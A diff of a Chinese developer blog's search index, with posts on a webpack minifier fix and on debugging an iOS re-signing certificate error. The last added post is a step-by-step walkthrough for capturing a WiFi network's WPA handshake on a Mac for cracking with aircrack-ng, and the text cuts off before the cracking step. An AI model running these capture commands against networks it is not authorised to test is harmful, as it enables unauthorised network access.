+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var path = require(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">var webpack = require(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"><span class="built_in">let</span> UglifyJsPlugin = require(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  entry: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    publicPath: <span class="string">&#x27;/dist/&#x27;</span>,</span><br><span class="line">    filename: <span class="string">&#x27;build.js&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.css$/,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;vue-style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">        ],</span><br><span class="line">      &#125;,      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.vue$/,</span><br><span class="line">        loader: <span class="string">&#x27;vue-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          loaders: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          // other vue-loader options go here</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.js$/,</span><br><span class="line">        loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">        exclude: /node_modules/</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.(png|jpg|gif|svg)$/,</span><br><span class="line">        loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          name: <span class="string">&#x27;[name].[ext]?[hash]&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    <span class="built_in">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    extensions: [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.vue&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">    noInfo: <span class="literal">true</span>,</span><br><span class="line">    overlay: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  performance: &#123;</span><br><span class="line">    hints: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimizer: [</span><br><span class="line">      new UglifyJsPlugin(&#123;</span><br><span class="line">        uglifyOptions: &#123;</span><br><span class="line">          compress: <span class="literal">false</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  devtool: <span class="string">&#x27;#eval-source-map&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  module.exports.devtool = <span class="string">&#x27;#source-map&#x27;</span></span><br><span class="line">  // http://vue-loader.vuejs.org/en/workflow/production.html</span><br><span class="line">  module.exports.plugins = (module.exports.plugins || []).concat([</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">&#x27;process.env&#x27;</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="string">&#x27;&quot;production&quot;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    new webpack.LoaderOptionsPlugin(&#123;</span><br><span class="line">      minimize: <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改动之处有2处，第一处，把<code>UglifyJsPlugin</code>放到上面的exports的<code>optimization</code>中；第二处，在文件开头之处导入<code>UglifyJsPlugin</code>。</p>
+<p>改完之后执行<code>npm run dev</code>，效果如下:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hu-YupingdeMacBook-Pro:demo2 kris$ npm run dev</span><br><span class="line"></span><br><span class="line">&gt; demo2@1.0.0 dev /Users/kris/Documents/VueDemo/chapter4/demo2</span><br><span class="line">&gt; cross-env NODE_ENV=development webpack-dev-server --open --hot</span><br></pre></td></tr></table></figure>
+
+<p>改完之后执行<code>npm run build</code>，效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^CHu-YupingdeMacBook-Pro:demo2 kris$ npm run build</span><br><span class="line"></span><br><span class="line">&gt; demo2@1.0.0 build /Users/kris/Documents/VueDemo/chapter4/demo2</span><br><span class="line">&gt; cross-env NODE_ENV=production webpack --progress --hide-modules</span><br><span class="line"></span><br><span class="line">Hash: e1e94d754213e6db3b2c</span><br><span class="line">Version: webpack 4.42.0</span><br><span class="line">Time: 1996ms</span><br><span class="line">Built at: 2020-03-19 13:51:57</span><br><span class="line">   Asset     Size  Chunks             Chunk Names</span><br><span class="line">build.js  213 KiB       0  [emitted]  main</span><br><span class="line">Entrypoint main = build.js</span><br><span class="line"></span><br><span class="line">WARNING <span class="keyword">in</span> configuration</span><br><span class="line">The <span class="string">&#x27;mode&#x27;</span> option has not been <span class="built_in">set</span>, webpack will fallback to <span class="string">&#x27;production&#x27;</span> <span class="keyword">for</span> this value. Set <span class="string">&#x27;mode&#x27;</span> option to <span class="string">&#x27;development&#x27;</span> or <span class="string">&#x27;production&#x27;</span> to <span class="built_in">enable</span> defaults <span class="keyword">for</span> each environment.</span><br><span class="line">You can also <span class="built_in">set</span> it to <span class="string">&#x27;none&#x27;</span> to <span class="built_in">disable</span> any default behavior. Learn more: https://webpack.js.org/configuration/mode/</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.jianshu.com/p/ceaf950a027b">webpack踩坑之路</a></p>
 ]]></content>
       <categories>
-        <category>通用</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>通用</tag>
+        <tag>前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次重签名错误</title>
+    <url>/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/</url>
+    <content><![CDATA[<h1 id="什么问题？"><a href="#什么问题？" class="headerlink" title="什么问题？"></a>什么问题？</h1><p>最近打开Cydia就闪退，我就重新去下载了uncOver，打算重新越狱一下，但是在重签名的时候一直失败，提示”No codesigning certificates found”的错误。</p>
+<img src="/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/1.png" class="" title="重签名失败的错误截图">
+
+<h1 id="什么原因导致？"><a href="#什么原因导致？" class="headerlink" title="什么原因导致？"></a>什么原因导致？</h1><p>由于我之前使用<code>iOS App Signer</code>这个MAC软件一直没有问题，今天遇到这个问题，我就想去github把源码克隆到本地，然后调试一下，看看具体是什么原因导致。<br>打开源码直接搜索<code>No codesigning</code>发现，这个错误是一个Alert弹框，和我们遇到的弹框信息一致。</p>
+<img src="/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/2.png" class="" title="搜索错误提示的截图">
+
+<p>最终调试发现，在程序调用<code>/usr/bin/security find-identity -v -p codesigning</code>命令时由于返回值为空，才触发错误弹框。</p>
+<img src="/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/3.png" class="" title="源码执行命令的截图">
+
+<p>我把命令拷贝到终端执行，发现返回有效的identity的数量是0:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/security find-identity -v -p codesigning</span><br><span class="line">     0 valid identities found</span><br></pre></td></tr></table></figure>
+
+<p>此处的命令的意思是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/security:</span><br><span class="line">A simple <span class="built_in">command</span> line interface <span class="built_in">which</span> lets you administer keychains, </span><br><span class="line">manipulate keys and certificates, and <span class="keyword">do</span> just about anything the </span><br><span class="line">Security framework is capable of from the <span class="built_in">command</span> line.</span><br><span class="line">(是一个管理钥匙串、keys和证书的命令行接口)</span><br><span class="line"></span><br><span class="line">find-identify:</span><br><span class="line">查找证书和私钥key的命令</span><br><span class="line"></span><br><span class="line">-v: 只显示有效的证书，默认显示所有的证书</span><br><span class="line"></span><br><span class="line">-p: 指定策略</span><br></pre></td></tr></table></figure>
+
+<p>具体的命令行的文档查看一下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/security find-identity --<span class="built_in">help</span></span><br><span class="line">find-identity: illegal option -- -</span><br><span class="line">Usage: find-identity [-p policy] [-s string] [-v] [keychain...]</span><br><span class="line">    -p  Specify policy to evaluate (multiple -p options are allowed)</span><br><span class="line">        Supported policies: basic, ssl-client, ssl-server, smime, eap,</span><br><span class="line">        ipsec, ichat, codesigning, sys-default, sys-kerberos-kdc, macappstore, appleID</span><br><span class="line">    -s  Specify optional policy-specific string (e.g. DNS hostname <span class="keyword">for</span> SSL,</span><br><span class="line">        or RFC822 email address <span class="keyword">for</span> S/MIME)</span><br><span class="line">    -v  Show valid identities only (default is to show all identities)</span><br><span class="line">If no keychains are specified to search, the default search list is used.</span><br><span class="line">        Find an identity (certificate + private key).</span><br></pre></td></tr></table></figure>
+
+<h1 id="怎么解决？"><a href="#怎么解决？" class="headerlink" title="怎么解决？"></a>怎么解决？</h1><p>由于使用<code>/usr/bin/security find-identity -v -p codesigning</code>命令无法查询本地有效的重签名证书，我首先想到的就是更换查询策略，根据命令行文档可以看出，策略有很多种，包括<code>basic, ssl-client ssl-server, smime, eap,ipsec, ichat, codesigning, sys-default, sys-kerberos-kdc, macappstore, appleID</code>。经过尝试，发现策略改成<code>appleID</code>的时候是可以查询到有效证书的。但是这两个命令是有区别的。具体的区别如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">poet@poetdeMacBook-Pro ~ % /usr/bin/security find-identity -v -p codesigning</span><br><span class="line">  1) C766972EC48052D14E3A2D715F03960E10B4XXXX <span class="string">&quot;Apple Development: Zhang San (MGRQJNV411)&quot;</span></span><br><span class="line">  2) 8EA5E415105CEE96F75EAFA443B6AC992FC9CCCC <span class="string">&quot;Apple Development: Li Si (SB6BFS5U22)&quot;</span></span><br><span class="line">  3) AEF5450BA48F61EE1B5A718B7563D855E306DDDD <span class="string">&quot;iPhone Developer: Zhang San (MGRQJNV433)&quot;</span></span><br><span class="line">     3 valid identities found</span><br><span class="line">poet@poetdeMacBook-Pro ~ % /usr/bin/security find-identity -v -p appleID    </span><br><span class="line">1.2.840.113635.78.1.30</span><br><span class="line">  1) F87912EA9F939D6F044F1B86A165C5D8AC8CAAAA <span class="string">&quot;com.apple.idms.appleid.prd.5675685073322f516b6a565a55775471374c72424b671234&quot;</span> (CSSMERR_TP_CERT_EXPIRED)</span><br><span class="line">  2) 8751799A43C85FEF3914DE664E2A05251F40BBBB <span class="string">&quot;Mac Developer: Lao Wang (H2C8DTYK00)&quot;</span> (CSSMERR_TP_CERT_EXPIRED)</span><br><span class="line">  3) C766972EC48052D14E3A2D715F03960E10B4CCCC <span class="string">&quot;Apple Development: Zhang San (MGRQJNV411)&quot;</span> (Missing required extension)</span><br><span class="line">  4) 8EA5E415105CEE96F75EAFA443B6AC992FC9DDDD <span class="string">&quot;Apple Development: Li Si (SB6BFS5U22)&quot;</span> (Missing required extension)</span><br><span class="line">  5) AEF5450BA48F61EE1B5A718B7563D855E306EEEE <span class="string">&quot;iPhone Developer: Zhang San (MGRQJNV433)&quot;</span> (Missing required extension)</span><br><span class="line">     5 valid identities found</span><br></pre></td></tr></table></figure>
+<p>经过上面的对比，发现策略是<code>codesigning</code>的时候查询出来的是所有有效的重签名的证书，不包含其他的证书（比如：苹果的idms官方证书、MAC电脑的证书等），但是策略是<code>appleID</code>的时候查询出来的证书一定包含策略<code>codesigning</code>查询出来的证书。所以，当使用策略<code>codesigning</code>无法查询出证书情况的时候，可以考虑把策略换成<code>appleID</code>来查询。所以解决办法就是将<code>codesigning</code>策略换成<code>appleID</code>的策略。</p>
+<h1 id="提交Pull-Request"><a href="#提交Pull-Request" class="headerlink" title="提交Pull Request"></a>提交Pull Request</h1><p>解决这个问题之后，我去github仓库的issue里面看，发现很多人也有类似的问题，我就自己尝试提交了一个<code>Pull Request</code>到作者的仓库，虽然作者很久没有更新了，但是如果后续还有人碰到此问题可以通过类似的办法解决。如何提交<code>Pull Request</code>，我是参考github上的一个帖子，具体步骤如下：</p>
+<h2 id="如何在别人的开源项目中提交自己的Pull-Request"><a href="#如何在别人的开源项目中提交自己的Pull-Request" class="headerlink" title="如何在别人的开源项目中提交自己的Pull Request ?"></a>如何在别人的开源项目中提交自己的Pull Request ?</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.先在本地创建一个空文件夹,里面准备放克隆过来的代码. --&gt; 我在本地Downloads文件夹下创建了一个名为 gitMessagekit 的文件夹.</span><br><span class="line">2.在<span class="string">&quot;终端&quot;</span>中通过<span class="built_in">cd</span>命令进入到gitMessagekit文件夹下(将<span class="string">&quot;自己电脑的用户名&quot;</span>换成你自己的电脑的用户名). --&gt; <span class="built_in">cd</span> /Users/自己电脑的用户名/3.Downloads/gitMessagekit</span><br><span class="line">3.在<span class="string">&quot;终端&quot;</span>输入克隆命令 git <span class="built_in">clone</span> 开源项目源代码的url. --&gt; git <span class="built_in">clone</span> https://github.com/MessageKit/MessageKit.git</span><br><span class="line">4.进入到克隆所在的文件夹. --&gt; <span class="built_in">cd</span> /Users/自己电脑的用户名/Downloads/gitMessagekit/MessageKit</span><br><span class="line">5.用查看命令查看一下开源项目都有多少个分支. --&gt; git branch -a</span><br><span class="line">6.找到自己要切换的分支,准备切换分支,在这里我要切换到3.0.0-beta分支. --&gt; git checkout remotes/origin/3.0.0-beta</span><br><span class="line">7.基于远程分支新建本地分支(3.0.0-beta),2条命令. --&gt; git branch 3.0.0-beta git checkout 3.0.0-beta</span><br><span class="line">8.打开/Users/自己电脑的用户名/Downloads/gitMessagekit/MessageKit该路径下的代码,对代码进行修改.</span><br><span class="line">9.添加修改. --&gt; git add 你修改的文件</span><br><span class="line">10.提交修改. --&gt; git commit -m <span class="string">&quot;fix 某某问题&quot;</span></span><br><span class="line">11.去自己的git仓库,准备fork一下开源项目MessageKit到自己的仓库(repository)中.</span><br><span class="line">12.即将关联自己fork过的项目. --&gt; git remote add upstream git@github.com:xxjldh/MessageKit.git</span><br><span class="line">13.推送本地的分支(3.0.0-beta)到自己fork过的仓库中,2条命令. --&gt; git fetch origin git merge origin/3.0.0-beta</span><br><span class="line">14.在即将提交时出现这样一个错误,git@github.com: Permission denied (publickey).解决办法(https://www.jianshu.com/p/f22d02c7d943)</span><br><span class="line">15.最后push自己的分支到自己fork过的仓库中. --&gt; git push upstream 3.0.0-beta</span><br><span class="line">16.在开源项目https://github.com/MessageKit/MessageKit.git的pull request中添加自己刚修改过的文件, 点<span class="string">&quot;comment pull request&quot;</span>即可.</span><br></pre></td></tr></table></figure>
+
+<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="">下载App重签名工具</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/pixy/p/4817579.html">Mac Security工具使用总结</a><br><a href="http://blog.fpliu.com/it/os/macOS/software/security">security命令</a><br><a href="https://gist.github.com/zxhfighter/62847a087a2a8031fbdf">如何给开源项目贡献代码</a></p>
+]]></content>
+      <categories>
+        <category>iOS越狱</category>
+      </categories>
+      <tags>
+        <tag>iOS越狱</tag>
       </tags>
   </entry>
   <entry>
@@ -3184,42 +3161,6 @@ NSRunLoopCommonModes并不是一个真的模式，它只是一个标记,timer能
       </categories>
       <tags>
         <tag>iOS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次重签名错误</title>
-    <url>/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/</url>
-    <content><![CDATA[<h1 id="什么问题？"><a href="#什么问题？" class="headerlink" title="什么问题？"></a>什么问题？</h1><p>最近打开Cydia就闪退，我就重新去下载了uncOver，打算重新越狱一下，但是在重签名的时候一直失败，提示”No codesigning certificates found”的错误。</p>
-<img src="/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/1.png" class="" title="重签名失败的错误截图">
-
-<h1 id="什么原因导致？"><a href="#什么原因导致？" class="headerlink" title="什么原因导致？"></a>什么原因导致？</h1><p>由于我之前使用<code>iOS App Signer</code>这个MAC软件一直没有问题，今天遇到这个问题，我就想去github把源码克隆到本地，然后调试一下，看看具体是什么原因导致。<br>打开源码直接搜索<code>No codesigning</code>发现，这个错误是一个Alert弹框，和我们遇到的弹框信息一致。</p>
-<img src="/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/2.png" class="" title="搜索错误提示的截图">
-
-<p>最终调试发现，在程序调用<code>/usr/bin/security find-identity -v -p codesigning</code>命令时由于返回值为空，才触发错误弹框。</p>
-<img src="/Blog/2021/01/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%87%8D%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF/3.png" class="" title="源码执行命令的截图">
-
-<p>我把命令拷贝到终端执行，发现返回有效的identity的数量是0:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/security find-identity -v -p codesigning</span><br><span class="line">     0 valid identities found</span><br></pre></td></tr></table></figure>
-
-<p>此处的命令的意思是：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/security:</span><br><span class="line">A simple <span class="built_in">command</span> line interface <span class="built_in">which</span> lets you administer keychains, </span><br><span class="line">manipulate keys and certificates, and <span class="keyword">do</span> just about anything the </span><br><span class="line">Security framework is capable of from the <span class="built_in">command</span> line.</span><br><span class="line">(是一个管理钥匙串、keys和证书的命令行接口)</span><br><span class="line"></span><br><span class="line">find-identify:</span><br><span class="line">查找证书和私钥key的命令</span><br><span class="line"></span><br><span class="line">-v: 只显示有效的证书，默认显示所有的证书</span><br><span class="line"></span><br><span class="line">-p: 指定策略</span><br></pre></td></tr></table></figure>
-
-<p>具体的命令行的文档查看一下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/security find-identity --<span class="built_in">help</span></span><br><span class="line">find-identity: illegal option -- -</span><br><span class="line">Usage: find-identity [-p policy] [-s string] [-v] [keychain...]</span><br><span class="line">    -p  Specify policy to evaluate (multiple -p options are allowed)</span><br><span class="line">        Supported policies: basic, ssl-client, ssl-server, smime, eap,</span><br><span class="line">        ipsec, ichat, codesigning, sys-default, sys-kerberos-kdc, macappstore, appleID</span><br><span class="line">    -s  Specify optional policy-specific string (e.g. DNS hostname <span class="keyword">for</span> SSL,</span><br><span class="line">        or RFC822 email address <span class="keyword">for</span> S/MIME)</span><br><span class="line">    -v  Show valid identities only (default is to show all identities)</span><br><span class="line">If no keychains are specified to search, the default search list is used.</span><br><span class="line">        Find an identity (certificate + private key).</span><br></pre></td></tr></table></figure>
-
-<h1 id="怎么解决？"><a href="#怎么解决？" class="headerlink" title="怎么解决？"></a>怎么解决？</h1><p>由于使用<code>/usr/bin/security find-identity -v -p codesigning</code>命令无法查询本地有效的重签名证书，我首先想到的就是更换查询策略，根据命令行文档可以看出，策略有很多种，包括<code>basic, ssl-client ssl-server, smime, eap,ipsec, ichat, codesigning, sys-default, sys-kerberos-kdc, macappstore, appleID</code>。经过尝试，发现策略改成<code>appleID</code>的时候是可以查询到有效证书的。但是这两个命令是有区别的。具体的区别如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">poet@poetdeMacBook-Pro ~ % /usr/bin/security find-identity -v -p codesigning</span><br><span class="line">  1) C766972EC48052D14E3A2D715F03960E10B4XXXX <span class="string">&quot;Apple Development: Zhang San (MGRQJNV411)&quot;</span></span><br><span class="line">  2) 8EA5E415105CEE96F75EAFA443B6AC992FC9CCCC <span class="string">&quot;Apple Development: Li Si (SB6BFS5U22)&quot;</span></span><br><span class="line">  3) AEF5450BA48F61EE1B5A718B7563D855E306DDDD <span class="string">&quot;iPhone Developer: Zhang San (MGRQJNV433)&quot;</span></span><br><span class="line">     3 valid identities found</span><br><span class="line">poet@poetdeMacBook-Pro ~ % /usr/bin/security find-identity -v -p appleID    </span><br><span class="line">1.2.840.113635.78.1.30</span><br><span class="line">  1) F87912EA9F939D6F044F1B86A165C5D8AC8CAAAA <span class="string">&quot;com.apple.idms.appleid.prd.5675685073322f516b6a565a55775471374c72424b671234&quot;</span> (CSSMERR_TP_CERT_EXPIRED)</span><br><span class="line">  2) 8751799A43C85FEF3914DE664E2A05251F40BBBB <span class="string">&quot;Mac Developer: Lao Wang (H2C8DTYK00)&quot;</span> (CSSMERR_TP_CERT_EXPIRED)</span><br><span class="line">  3) C766972EC48052D14E3A2D715F03960E10B4CCCC <span class="string">&quot;Apple Development: Zhang San (MGRQJNV411)&quot;</span> (Missing required extension)</span><br><span class="line">  4) 8EA5E415105CEE96F75EAFA443B6AC992FC9DDDD <span class="string">&quot;Apple Development: Li Si (SB6BFS5U22)&quot;</span> (Missing required extension)</span><br><span class="line">  5) AEF5450BA48F61EE1B5A718B7563D855E306EEEE <span class="string">&quot;iPhone Developer: Zhang San (MGRQJNV433)&quot;</span> (Missing required extension)</span><br><span class="line">     5 valid identities found</span><br></pre></td></tr></table></figure>
-<p>经过上面的对比，发现策略是<code>codesigning</code>的时候查询出来的是所有有效的重签名的证书，不包含其他的证书（比如：苹果的idms官方证书、MAC电脑的证书等），但是策略是<code>appleID</code>的时候查询出来的证书一定包含策略<code>codesigning</code>查询出来的证书。所以，当使用策略<code>codesigning</code>无法查询出证书情况的时候，可以考虑把策略换成<code>appleID</code>来查询。所以解决办法就是将<code>codesigning</code>策略换成<code>appleID</code>的策略。</p>
-<h1 id="提交Pull-Request"><a href="#提交Pull-Request" class="headerlink" title="提交Pull Request"></a>提交Pull Request</h1><p>解决这个问题之后，我去github仓库的issue里面看，发现很多人也有类似的问题，我就自己尝试提交了一个<code>Pull Request</code>到作者的仓库，虽然作者很久没有更新了，但是如果后续还有人碰到此问题可以通过类似的办法解决。如何提交<code>Pull Request</code>，我是参考github上的一个帖子，具体步骤如下：</p>
-<h2 id="如何在别人的开源项目中提交自己的Pull-Request"><a href="#如何在别人的开源项目中提交自己的Pull-Request" class="headerlink" title="如何在别人的开源项目中提交自己的Pull Request ?"></a>如何在别人的开源项目中提交自己的Pull Request ?</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.先在本地创建一个空文件夹,里面准备放克隆过来的代码. --&gt; 我在本地Downloads文件夹下创建了一个名为 gitMessagekit 的文件夹.</span><br><span class="line">2.在<span class="string">&quot;终端&quot;</span>中通过<span class="built_in">cd</span>命令进入到gitMessagekit文件夹下(将<span class="string">&quot;自己电脑的用户名&quot;</span>换成你自己的电脑的用户名). --&gt; <span class="built_in">cd</span> /Users/自己电脑的用户名/3.Downloads/gitMessagekit</span><br><span class="line">3.在<span class="string">&quot;终端&quot;</span>输入克隆命令 git <span class="built_in">clone</span> 开源项目源代码的url. --&gt; git <span class="built_in">clone</span> https://github.com/MessageKit/MessageKit.git</span><br><span class="line">4.进入到克隆所在的文件夹. --&gt; <span class="built_in">cd</span> /Users/自己电脑的用户名/Downloads/gitMessagekit/MessageKit</span><br><span class="line">5.用查看命令查看一下开源项目都有多少个分支. --&gt; git branch -a</span><br><span class="line">6.找到自己要切换的分支,准备切换分支,在这里我要切换到3.0.0-beta分支. --&gt; git checkout remotes/origin/3.0.0-beta</span><br><span class="line">7.基于远程分支新建本地分支(3.0.0-beta),2条命令. --&gt; git branch 3.0.0-beta git checkout 3.0.0-beta</span><br><span class="line">8.打开/Users/自己电脑的用户名/Downloads/gitMessagekit/MessageKit该路径下的代码,对代码进行修改.</span><br><span class="line">9.添加修改. --&gt; git add 你修改的文件</span><br><span class="line">10.提交修改. --&gt; git commit -m <span class="string">&quot;fix 某某问题&quot;</span></span><br><span class="line">11.去自己的git仓库,准备fork一下开源项目MessageKit到自己的仓库(repository)中.</span><br><span class="line">12.即将关联自己fork过的项目. --&gt; git remote add upstream git@github.com:xxjldh/MessageKit.git</span><br><span class="line">13.推送本地的分支(3.0.0-beta)到自己fork过的仓库中,2条命令. --&gt; git fetch origin git merge origin/3.0.0-beta</span><br><span class="line">14.在即将提交时出现这样一个错误,git@github.com: Permission denied (publickey).解决办法(https://www.jianshu.com/p/f22d02c7d943)</span><br><span class="line">15.最后push自己的分支到自己fork过的仓库中. --&gt; git push upstream 3.0.0-beta</span><br><span class="line">16.在开源项目https://github.com/MessageKit/MessageKit.git的pull request中添加自己刚修改过的文件, 点<span class="string">&quot;comment pull request&quot;</span>即可.</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/pixy/p/4817579.html">Mac Security工具使用总结</a><br><a href="http://blog.fpliu.com/it/os/macOS/software/security">security命令</a><br><a href="https://gist.github.com/zxhfighter/62847a087a2a8031fbdf">如何给开源项目贡献代码</a></p>
-]]></content>
-      <categories>
-        <category>iOS越狱</category>
-      </categories>
-      <tags>
-        <tag>iOS越狱</tag>
       </tags>
   </entry>
   <entry>
@@ -3549,6 +3490,66 @@ NSRunLoopCommonModes并不是一个真的模式，它只是一个标记,timer能
       </categories>
       <tags>
         <tag>iOS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MAC破解WiFi</title>
+    <url>/Blog/2020/03/15/MAC%E7%A0%B4%E8%A7%A3WiFi/</url>
+    <content><![CDATA[<p>1.安装airport</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport</span><br></pre></td></tr></table></figure>
+
+<p>2.扫描周围的Wifi</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo airport -s</span><br></pre></td></tr></table></figure>
+
+<p>3.嗅探指定的信道</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo airport en0 sniff <span class="variable">$CHANNEL</span></span><br></pre></td></tr></table></figure>
+
+<p>如果出现错误，Segmentation fault: 11，可以使用 tcpdump 抓包<br>4.1 断开airport的连接</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo airport -z</span><br></pre></td></tr></table></figure>
+
+<p>4.2 设置信道，-c和信道号之间没有空格</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo airport -c6</span></span><br><span class="line">$ sudo airport -c<span class="variable">$CHANNEL</span></span><br></pre></td></tr></table></figure>
+
+<p>4.3 从指定AP开始抓包</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo tcpdump &quot;type mgt subtype beacon and ether src 98:13:33:b4:35:a4&quot; -I -c 1 -i en0 -w beacon.cap</span></span><br><span class="line">$ sudo tcpdump <span class="string">&quot;type mgt subtype beacon and ether src <span class="variable">$BSSID</span>&quot;</span> -I -c 1 -i en0 -w beacon.cap</span><br></pre></td></tr></table></figure>
+
+<p>4.4 等待WPA的握手</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo tcpdump &quot;ether proto 0x888e and ether host 98:13:33:b4:35:a4&quot; -I -U -vvv -i en0 -w handshake.cap</span></span><br><span class="line">$ sudo tcpdump <span class="string">&quot;ether proto 0x888e and ether host <span class="variable">$BSSID</span>&quot;</span> -I -U -vvv -i en0 -w handshake.cap</span><br></pre></td></tr></table></figure>
+
+<p>4.5 安装wireshark，下一步会用到它的合包命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install wireshark</span><br></pre></td></tr></table></figure>
+
+<p>4.6 将2个cap文件合并成一个cap文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap</span><br></pre></td></tr></table></figure>
+
+<p>至少要等到4.4获取到4 frames或更多的包才可以Ctrl-C终止抓包。</p>
+<p>4.7 安装 aircrack-ng</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install aircrack-ng</span><br></pre></td></tr></table></figure>
+
